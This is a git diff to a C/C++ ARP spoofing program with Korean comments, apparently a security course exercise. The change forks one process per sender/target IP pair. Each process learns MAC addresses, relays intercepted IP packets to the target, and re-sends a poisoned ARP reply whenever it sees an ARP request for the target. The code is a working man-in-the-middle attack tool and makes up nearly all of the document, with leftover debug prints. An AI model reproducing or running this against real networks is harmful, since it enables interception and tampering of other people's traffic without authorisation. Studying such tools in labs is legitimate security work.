@@ -35,18 +35,14 @@ void get_net_info(char *iface, uint8_t *mac, unsigned int *ip) {
 }
 
 
-int main(int argc, char* argv[]) {
-	if (argc < 3 || argc % 2 == 1) {
-		usage();
-		return -1;
-	}
-	char* iface = argv[1];
+int process_ip_pair(char* inface, char* sender_ip, char* target_ip) {
+	char* iface = inface;
 	struct net_info attacker;
 	struct net_info sender;
 	struct net_info target;
-	sender.ipv4 = Ip(argv[2]);
-	target.ipv4 = Ip(argv[3]);
-	get_net_info(argv[1], attacker.mac, &attacker.ipv4); // mac, ip 받아오기
+	sender.ipv4 = Ip(sender_ip);
+	target.ipv4 = Ip(target_ip);
+	get_net_info(inface, attacker.mac, &attacker.ipv4); // mac, ip 받아오기
 	// sender에게 arp 요청 보내서 mac 받기 위한 arp 패킷 정의
 	EthArpPacket arp_packet_to_sender;
 	arp_packet_to_sender.eth_.dmac_ = Mac("FF-FF-FF-FF-FF-FF");
@@ -60,7 +56,7 @@ int main(int argc, char* argv[]) {
 	arp_packet_to_sender.arp_.sip_ = attacker.ipv4;
 	arp_packet_to_sender.arp_.smac_ = Mac(attacker.mac);
 	arp_packet_to_sender.arp_.tmac_ = Mac("00-00-00-00-00-00");
-	arp_packet_to_sender.arp_.tip_ = htonl(Ip(argv[2]));
+	arp_packet_to_sender.arp_.tip_ = htonl(Ip(sender_ip));
 
 	EthArpPacket arp_packet_to_target;
 	arp_packet_to_target.eth_.dmac_ = Mac("FF-FF-FF-FF-FF-FF");
@@ -74,7 +70,7 @@ int main(int argc, char* argv[]) {
 	arp_packet_to_target.arp_.sip_ = attacker.ipv4;
 	arp_packet_to_target.arp_.smac_ = Mac(attacker.mac);
 	arp_packet_to_target.arp_.tmac_ = Mac("00-00-00-00-00-00");
-	arp_packet_to_target.arp_.tip_ = htonl(Ip(argv[3]));
+	arp_packet_to_target.arp_.tip_ = htonl(Ip(target_ip));
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* packet = pcap_open_live(iface, BUFSIZ, 1, 1, errbuf);
@@ -92,7 +88,7 @@ int main(int argc, char* argv[]) {
 		const u_char* re_packet;
 		int res = pcap_next_ex(packet, &header, &re_packet);
 		EthArpPacket* reply = (EthArpPacket*)re_packet;
-		if (reply->arp_.sip_ == Ip(htonl(Ip(argv[2])))){
+		if (reply->arp_.sip_ == Ip(htonl(Ip(sender_ip)))){
 			memcpy(sender.mac, &reply->arp_.smac_, sizeof(sender.mac));
 			break;
 		}
@@ -108,7 +104,7 @@ int main(int argc, char* argv[]) {
 		const u_char* re_packet;
 		int res = pcap_next_ex(packet, &header, &re_packet);
 		EthArpPacket* reply = (EthArpPacket*)re_packet;
-		if (reply->arp_.sip_ == Ip(htonl(Ip(argv[3])))){
+		if (reply->arp_.sip_ == Ip(htonl(Ip(target_ip)))){
 			memcpy(target.mac, &reply->arp_.smac_, sizeof(target.mac));
 			break;
 		}
@@ -146,19 +142,59 @@ int main(int argc, char* argv[]) {
 		libnet_ethernet_hdr *eth_hdr=(libnet_ethernet_hdr *)re_packet;
 		libnet_ipv4_hdr *ipv4_hdr=(libnet_ipv4_hdr *)(re_packet + 14);
 		fprintf(stderr, "7");
-		if (ipv4_hdr->ip_dst.s_addr == htonl(Ip(argv[3]))){
+		if (ipv4_hdr->ip_dst.s_addr == htonl(Ip(target_ip))){
 			for(int i=0; i<6; i++){
 			relay_packet[i] = target.mac[i];
-			fprintf(stderr, "5");
 			}
+			fprintf(stderr, "5");
 			atk = pcap_sendpacket(packet, relay_packet, header->len);
 			if (atk != 0) {
 				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", atk, pcap_geterr(packet));
 			}
+			
+			
 		
+		
+		}
+		if ((ntohs(eth_hdr->ether_type) == 0x0806)){
+			fprintf(stderr, "asdsasad");
+			EthArpPacket *tmp_eth = (EthArpPacket *)(re_packet);
+			if (tmp_eth->arp_.tip_ == Ip(htonl(Ip(target_ip))) && (tmp_eth->arp_.op_ == htons(ArpHdr::Request))){
+			fprintf(stderr, "========");
+			atk = pcap_sendpacket(packet, reinterpret_cast<const u_char*>(&arp_packet), sizeof(EthArpPacket));
+			if (atk != 0) {
+				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", atk, pcap_geterr(packet));
+			}
+			}
 		}
 		fprintf(stderr, "6");
 	}
 	
 		pcap_close(packet);
+}
+
+int main(int argc, char* argv[]) {
+    if (argc < 3 || argc % 2 == 1) {
+        usage();
+        return -1;
+    }
+
+    char* iface = argv[1];
+    for (int i = 2; i < argc; i += 2) {
+        pid_t pid = fork(); // 자식 프로세스 생성
+        if (pid == 0) { // 자식 프로세스 내부
+            process_ip_pair(iface, argv[i], argv[i + 1]);
+            exit(0); // 자식 프로세스 종료
+        } else if (pid < 0) {
+            perror("fork failed");
+            return -1;
+        }
+    }
+
+    // 부모 프로세스는 모든 자식 프로세스가 완료될 때까지 대기
+    for (int i = 2; i < argc; i += 2) {
+        wait(NULL);
+    }
+
+    return 0;
 }
